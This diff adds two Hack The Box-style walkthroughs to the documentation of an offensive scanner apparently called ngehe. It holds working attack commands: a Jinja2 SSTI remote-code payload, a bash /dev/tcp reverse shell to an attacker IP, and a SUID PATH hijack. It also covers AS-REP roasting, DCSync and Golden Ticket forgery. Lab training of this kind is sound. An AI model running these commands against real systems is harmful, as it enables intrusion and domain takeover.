@@ -413,6 +413,258 @@ fi
 
 Keep capture files and tokens out of source control. Generate them from short-lived test credentials inside the CI environment.
 
+## Worked HTB Walkthroughs
+
+Two end-to-end scenarios that show how ngehe's output maps to an actual box-pwning workflow. Both are realistic composites of common HTB patterns, not specific boxes (no spoilers).
+
+### Walkthrough 1 — Web-flavored Linux box (SSTI → user shell → SUID → root)
+
+You spawn an HTB box. The dashboard says it's at `10.10.11.42`. You add it to `/etc/hosts` as `box.htb` and start.
+
+```bash
+# Step 0 — sanity check ngehe + deps
+ngehe doctor
+
+# If nmap is missing:
+#   Linux:  sudo apt install nmap   (or dnf install nmap / pacman -S nmap)
+#   macOS:  brew install nmap
+```
+
+**Step 1 — full-spectrum scan.**
+
+```bash
+ngehe box --target 10.10.11.42 --domain box.htb \
+  --profile quick --markdown box.md --top 800
+```
+
+Real-looking output to stderr:
+
+```text
+ngehe box → 10.10.11.42 (profile=quick)
+running: nmap -T4 -Pn --open -sV -oX - --top-ports 100 10.10.11.42
+port-scan: 3 open services
+tcp/22 ssh                     → 2 findings
+tcp/80 http                    → 47 findings
+tcp/53 domain                  → 1 findings
+total: 50 findings
+```
+
+**Step 2 — read the attack chain at the top of `box.md`.**
+
+```markdown
+## Suggested attack chain
+
+1. [CRITICAL] ssti — GET /api/render
+   param: query:msg  payload: {{1337*1331}}
+   evidence: Jinja2/Twig/Liquid evaluated 1337*1331 → 1779547
+
+   RCE via template. Engine identified in evidence — chain to OS commands:
+     Jinja2:    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+     ...
+
+2. [HIGH] sensitive-file — GET /.env
+   evidence: 88 bytes; preview: "DATABASE_URL=postgres://app:hunter2@localhost/app
+                                 SECRET_KEY=super-secret"
+
+   Read the file then escalate:
+     .env → read env vars (DB creds, SECRET_KEY for session forging, AWS keys)
+     ...
+
+3. [HIGH] dns-axfr-allowed — TCP dns://10.10.11.42:53/box.htb.
+   evidence: dev.box.htb. IN A 10.10.11.42 / admin.box.htb. IN A 10.10.11.42 / ...
+
+   Zone transferred. Add every hostname to /etc/hosts and treat them as new vhost targets.
+```
+
+**Step 3 — go after the SSTI first** (highest impact, has a clean RCE chain).
+
+Use the payload from the chain. URL-encode the braces and confirm RCE:
+
+```bash
+curl -G "http://box.htb/api/render" \
+  --data-urlencode "msg={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+
+# Returns something like:
+# {"rendered":"Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
+```
+
+Confirmed: arbitrary OS commands as `www-data`. Catch a reverse shell.
+
+```bash
+# Terminal 1 — listener
+nc -lvnp 4444
+
+# Terminal 2 — fire the reverse shell payload (replace IP with your tun0)
+curl -G "http://box.htb/api/render" --data-urlencode \
+  "msg={{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/10.10.14.7/4444 0>&1\"').read()}}"
+```
+
+You catch the shell. Upgrade to a proper TTY:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+^Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+**Step 4 — get user.txt and look for privesc paths.**
+
+```bash
+cat /home/*/user.txt                        # capture user flag
+find / -perm -4000 -type f 2>/dev/null      # SUID binaries
+sudo -l                                     # what can www-data sudo as?
+cat /etc/crontab                            # any privileged cron?
+```
+
+You spot `/usr/local/bin/backup-tool` is SUID-root. `strings` reveals it calls `tar` without an absolute path. Classic PATH-hijack:
+
+```bash
+echo '#!/bin/bash
+chmod +s /bin/bash' > /tmp/tar
+chmod +x /tmp/tar
+export PATH=/tmp:$PATH
+/usr/local/bin/backup-tool        # now runs your tar as root
+/bin/bash -p                       # SUID bash → root shell
+```
+
+**Step 5 — root.txt.**
+
+```bash
+cat /root/root.txt
+```
+
+That's a representative chain. ngehe found the initial RCE and gave you the exact payload. Manual work was upgrading the shell and chaining to root.
+
+---
+
+### Walkthrough 2 — Active Directory box (LDAP enum → AS-REP roast → BloodHound → DCSync → DA)
+
+Box at `10.10.11.99`, domain `corp.htb`. Add both to `/etc/hosts`.
+
+**Step 1 — full-spectrum scan.**
+
+```bash
+ngehe box --target 10.10.11.99 --domain corp.htb \
+  --profile service --markdown box.md
+```
+
+Output:
+
+```text
+tcp/53 domain                  → 1 findings
+tcp/88 kerberos-sec            → 0 findings    (just open; no deep probing yet)
+tcp/135 msrpc                  → 0 findings
+tcp/139 netbios-ssn            → 1 findings
+tcp/389 ldap                   → 3 findings
+tcp/445 microsoft-ds           → 2 findings
+tcp/3268 globalcatLDAP         → 0 findings
+total: 12 findings
+```
+
+Top of `box.md`:
+
+```markdown
+## Suggested attack chain
+
+1. [HIGH] ldap-asrep-roastable — TCP ldap://10.10.11.99:389/
+   evidence: svc-helpdesk, kiosk, guest-printer
+
+   ngehe's kerberos.ASREPRoast will produce hashes — or use impacket:
+   GetNPUsers.py corp.htb/ -no-pass -usersfile users.txt
+
+2. [MEDIUM] ldap-user-enum — TCP ldap://10.10.11.99:389/
+   evidence: administrator, krbtgt, alice, bob, svc-helpdesk, ...
+   enumerated 47 domain users via LDAP — feed into kerbrute / AS-REP roast / spray
+
+3. [HIGH] smb-anonymous-allowed — TCP smb://10.10.11.99:445/
+   evidence: shares: IPC$, NETLOGON, SYSVOL, public
+```
+
+**Step 2 — AS-REP roast the flagged accounts.**
+
+```bash
+# Save the user list ngehe produced
+jq -r 'select(.rule == "ldap-user-enum") | .evidence' box.jsonl \
+  | tr ',' '\n' | sed 's/^ *//' > users.txt
+
+# AS-REP roast (using impacket — the playbook hint points you here)
+GetNPUsers.py corp.htb/ -no-pass -usersfile users.txt -outputfile asrep.hashes
+```
+
+Roast yields a hash for `svc-helpdesk`. Crack it:
+
+```bash
+hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
+# svc-helpdesk:Welcome1!
+```
+
+**Step 3 — pivot inside AD.** You're now a domain user. Run BloodHound's collector (or use ngehe's Go primitives once wired):
+
+```bash
+bloodhound-python -u svc-helpdesk -p 'Welcome1!' -d corp.htb \
+  -ns 10.10.11.99 -c all
+```
+
+Import the JSON into BloodHound CE. Run "Shortest paths to Domain Admins" from `SVC-HELPDESK@CORP.HTB`:
+
+```
+SVC-HELPDESK → MemberOf → HELPDESK group → ForceChangePassword → SYSADMINS group → AdminTo → DC01
+```
+
+`ForceChangePassword` on a sysadmin account is the lever.
+
+**Step 4 — exploit the ACL.**
+
+```bash
+# Reset bob's password (bob is in SYSADMINS)
+net rpc password 'bob' -U 'corp.htb/svc-helpdesk%Welcome1!' -S 10.10.11.99
+# (enter a new password — Pwn3d2026!)
+```
+
+**Step 5 — DCSync as bob → krbtgt → Golden Ticket → DA.**
+
+```bash
+# Dump every domain hash including krbtgt
+secretsdump.py corp.htb/bob:'Pwn3d2026!'@10.10.11.99 -just-dc
+
+# Forge a Golden Ticket
+ticketer.py -nthash <krbtgt-nt-hash> -domain-sid <SID> \
+  -domain corp.htb administrator
+export KRB5CCNAME=administrator.ccache
+
+# WinRM in as Domain Admin
+evil-winrm -i 10.10.11.99 -u administrator -H <admin-nt-hash>
+
+# Loot
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+ngehe gave you the user list, the AS-REP-roastable subset, and the playbook of what to do next. The remaining work — Kerberos cracking, graph analysis, AD takeover — uses dedicated tools (`hashcat`, `BloodHound`, `impacket`) that already do those jobs well.
+
+---
+
+### What ngehe did and didn't do for you in those walkthroughs
+
+**ngehe did:**
+- Discovered open ports + identified services (via nmap)
+- Found the SSTI bug + told you the exact engine + gave you the RCE payload
+- Surfaced the .env / .git / sensitive files
+- Got the DNS zone transfer (Walkthrough 1)
+- Enumerated AD users + flagged AS-REP-roastable accounts (Walkthrough 2)
+- Identified SMB anonymous access (Walkthrough 2)
+- Bundled all of that into a Suggested attack chain at the top of the markdown report — including the literal commands for what to do next
+
+**You did manually:**
+- Crafted the reverse-shell payload (substituted your attacker IP)
+- Upgraded the shell to a TTY
+- Found the SUID privesc (next time, automate with `linpeas` / `winpeas`)
+- Ran hashcat (ngehe outputs hashcat-format; doesn't crack)
+- Used BloodHound's graph (ngehe emits the JSON; BloodHound visualizes)
+- DCSynced (out of ngehe's scope today; use `impacket`)
+
+The split is intentional: ngehe automates **discovery + initial-exploitation evidence**. Cracking, graph analysis, AD takeover are dedicated jobs handled by `hashcat`, `BloodHound`, and `impacket` respectively.
+
 ## End-to-End Demo
 
 The repository ships a deliberately vulnerable demo API with a planted bug for every detector:
